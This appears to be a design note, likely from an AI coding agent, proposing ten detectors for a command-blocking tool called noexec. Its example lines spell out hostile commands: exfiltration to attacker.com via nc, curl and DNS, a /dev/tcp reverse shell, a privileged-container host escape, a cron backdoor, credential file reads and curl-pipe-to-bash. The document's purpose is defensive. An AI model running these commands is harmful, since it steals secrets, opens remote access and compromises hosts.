# Security Research: High-Value Detectors for noexec

Based on common AI coding assistant security risks, command injection vulnerabilities, and real-world attack patterns, here are **10 high-value security detectors** to implement:

---

## 🎯 Top 10 High-Value Detectors

### 1. **Container Escape Detector** ⭐⭐⭐⭐⭐

**Risk Level:** CRITICAL  
**Why Important:** Container escapes can compromise the entire host system

**Patterns to Detect:**

- Docker socket mounting: `docker run -v /var/run/docker.sock`
- Privileged containers: `docker run --privileged`
- Host network mode: `docker run --network=host`
- Host PID namespace: `docker run --pid=host`
- Capability additions: `docker run --cap-add=SYS_ADMIN`
- Breaking out of containers: `/proc/sys/kernel/core_pattern` manipulation
- cgroups release_agent exploitation
- `nsenter` abuse to enter host namespaces

**Real-world Example:**

```bash
# AI might suggest for "debugging"
docker run --privileged -v /:/host alpine chroot /host
```

---

### 2. **Code Injection Detector** ⭐⭐⭐⭐⭐

**Risk Level:** CRITICAL  
**Why Important:** Can execute arbitrary code, exfiltrate data, install backdoors

**Patterns to Detect:**

- `eval()` in scripting languages
- `exec()` with user input
- Dynamic code loading: `import()`, `require()` with variables
- Template injection: `{{ }}`, `${ }` with untrusted input
- SQL injection patterns: raw SQL with concatenation
- Command substitution: `` `command` ``, `$(command)`
- Deserializing untrusted data: `pickle.loads()`, `eval(JSON.parse())`

**Real-world Example:**

```bash
# Dangerous eval
python -c "eval(input())"
node -e "eval(process.argv[2])"
```

---

### 3. **Backdoor/Persistence Detector** ⭐⭐⭐⭐⭐

**Risk Level:** CRITICAL  
**Why Important:** Attackers establish persistent access

**Patterns to Detect:**

- Cron job creation: `crontab -e`, `echo "* * * * *" >> /etc/cron.d/`
- Systemd service creation: `systemctl enable`, writing to `/etc/systemd/system/`
- SSH key manipulation: Adding to `~/.ssh/authorized_keys`
- Login shell modification: changing `/etc/passwd`, `~/.bashrc`, `~/.profile`
- Startup script modification: `/etc/rc.local`, `~/.config/autostart/`
- SUID binary creation: `chmod u+s`
- Library preloading: `LD_PRELOAD`, `/etc/ld.so.preload`
- Browser extension installation

**Real-world Example:**

```bash
# AI might suggest for "auto-starting service"
echo "* * * * * /tmp/backdoor.sh" | crontab -
```

---

### 4. **Network Exfiltration Detector** ⭐⭐⭐⭐⭐

**Risk Level:** HIGH  
**Why Important:** Data theft, credential exfiltration

**Patterns to Detect:**

- Piping data to network: `cat secret | nc attacker.com 1234`
- Base64 encoding + HTTP: `curl -X POST -d "$(cat .env | base64)"`
- DNS exfiltration: `dig $(cat secret).attacker.com`
- Hidden wget/curl: downloading to `/dev/shm`, `/tmp`
- Reverse shells: `bash -i >& /dev/tcp/attacker/1234`
- HTTP POST of sensitive files
- Webhook exfiltration: posting to external URLs
- Git push to suspicious remotes

**Real-world Example:**

```bash
# Exfiltrate environment variables
env | curl -X POST https://attacker.com/collect -d @-
```

---

### 5. **Package Manager Poisoning Detector** ⭐⭐⭐⭐

**Risk Level:** HIGH  
**Why Important:** Supply chain attacks via malicious packages

**Patterns to Detect:**

- Installing from untrusted sources: `npm install http://`
- Package install with postinstall scripts from untrusted repos
- `pip install` from GitHub without verification
- Typosquatting attempts: common package name misspellings
- Installing with `--no-verify`, `--ignore-scripts` bypassed
- Modifying package registries: `npm config set registry`
- Installing packages as root: `sudo npm install -g`
- Unusual package sources: `git+ssh://`, `file://`

**Real-world Example:**

```bash
# AI might suggest typo
npm install reactt  # instead of react
pip install requsts  # instead of requests
```

---

### 6. **Firewall/Security Tool Disabling Detector** ⭐⭐⭐⭐

**Risk Level:** HIGH  
**Why Important:** Removes security protections

**Patterns to Detect:**

- Firewall manipulation: `ufw disable`, `iptables -F`, `firewall-cmd --remove-all`
- SELinux disabling: `setenforce 0`, modifying `/etc/selinux/config`
- AppArmor disabling: `systemctl stop apparmor`
- Antivirus disabling: Windows Defender commands
- Audit logging disabling: `auditctl -D`, stopping auditd
- Logging disabling: `systemctl stop rsyslog`
- Security updates disabling: `apt-mark hold`, `yum-config-manager --disable`

**Real-world Example:**

```bash
# "Fixing" by disabling security
sudo ufw disable
sudo setenforce 0
```

---

### 7. **Credential Harvesting Detector** ⭐⭐⭐⭐

**Risk Level:** HIGH  
**Why Important:** Credential theft enables further attacks

**Patterns to Detect:**

- Browser credential dumping: accessing Chrome/Firefox password databases
- SSH key copying: `cat ~/.ssh/id_rsa`
- AWS credential access: `cat ~/.aws/credentials`
- Docker credential helper access
- Kubernetes config copying: `cat ~/.kube/config`
- Password manager database access
- Shell history scraping: `cat ~/.bash_history`
- `/proc` credential scraping: reading other processes' memory

**Real-world Example:**

```bash
# "Debugging" SSH
cat ~/.ssh/id_rsa | base64
```

---

### 8. **Process Manipulation Detector** ⭐⭐⭐⭐

**Risk Level:** HIGH  
**Why Important:** Can hide malicious activity, tamper with running processes

**Patterns to Detect:**

- Process injection: `ptrace` syscalls, `/proc/[pid]/mem` writing
- Debugger attachment: `gdb -p [pid]`, `strace -p`
- Process hiding: modifying `/proc`, hooking system calls
- Signal manipulation: killing security processes
- Memory dumping: `gcore`, `/proc/[pid]/maps` reading
- Core dump enabling: `ulimit -c unlimited`
- Process priority manipulation: `nice -n -20`, `renice`

**Real-world Example:**

```bash
# Attaching to running process
gdb -p $(pgrep -f 'sensitive-app') -batch -ex 'dump memory /tmp/dump.bin'
```

---

### 9. **Archive Bomb/Path Traversal Detector** ⭐⭐⭐⭐

**Risk Level:** MEDIUM-HIGH  
**Why Important:** Denial of service, file overwrite attacks

**Patterns to Detect:**

- Extracting untrusted archives: `tar xf`, `unzip` without validation
- Path traversal in archives: `../../../etc/passwd`
- Archive bombs: 42.zip, zip of zips
- Symbolic link attacks in tarballs
- Extracting to sensitive locations: `/etc`, `/usr/bin`
- Large file extraction without space checks
- Zip slip vulnerabilities

**Real-world Example:**

```bash
# Extracting untrusted archive
curl https://untrusted.com/file.tar.gz | tar xz
```

---

### 10. **Binary Download & Execute Detector** ⭐⭐⭐⭐

**Risk Level:** HIGH  
**Why Important:** Common malware delivery method

**Patterns to Detect:**

- Download + execute pattern: `curl http://... | bash`
- Download + chmod + execute: `wget -O /tmp/script && chmod +x && ./script`
- Pipe to interpreter: `curl ... | python`, `wget -O- | sh`
- Executing from `/tmp`, `/dev/shm`, `~/.cache`
- Downloading unsigned binaries
- Running binaries from unusual locations
- `curl` with follow redirects to executable files

**Real-world Example:**

```bash
# "Install script" from AI
curl -sSL https://get.something.com/install.sh | sudo bash
```

---

## 📊 Priority Matrix

| Detector                  | Severity | Frequency | Implementation Complexity | Priority Score |
| ------------------------- | -------- | --------- | ------------------------- | -------------- |
| Container Escape          | CRITICAL | Medium    | Medium                    | 🔥 9/10        |
| Code Injection            | CRITICAL | High      | Medium                    | 🔥 10/10       |
| Backdoor/Persistence      | CRITICAL | Medium    | Medium                    | 🔥 9/10        |
| Network Exfiltration      | HIGH     | High      | Medium                    | 🔥 9/10        |
| Package Poisoning         | HIGH     | High      | Low                       | 🔥 8/10        |
| Security Tool Disabling   | HIGH     | Medium    | Low                       | 🔥 8/10        |
| Credential Harvesting     | HIGH     | High      | Medium                    | 🔥 9/10        |
| Process Manipulation      | HIGH     | Low       | High                      | 🔥 7/10        |
| Archive Bomb              | MEDIUM   | Medium    | Low                       | 🔥 7/10        |
| Binary Download & Execute | HIGH     | Very High | Low                       | 🔥 10/10       |

---

## 🎯 Recommended Implementation Order

1. **Binary Download & Execute** (easiest, highest impact)
2. **Package Manager Poisoning** (common, easy to detect)
3. **Security Tool Disabling** (critical protection)
4. **Network Exfiltration** (high risk, medium complexity)
5. **Backdoor/Persistence** (critical for security)
6. **Credential Harvesting** (medium complexity)
7. **Code Injection** (complex but critical)
8. **Container Escape** (specialized but important)
9. **Archive Bomb/Path Traversal** (lower priority)
10. **Process Manipulation** (advanced, lower frequency)

---

## 🚀 Next Steps

Ready to spawn sub-agents to implement these detectors! Each will:

- Implement the detector with comprehensive patterns
- Write tests (unit + integration)
- Document in DETECTORS.md
- Maintain 90%+ coverage

Shall I proceed?
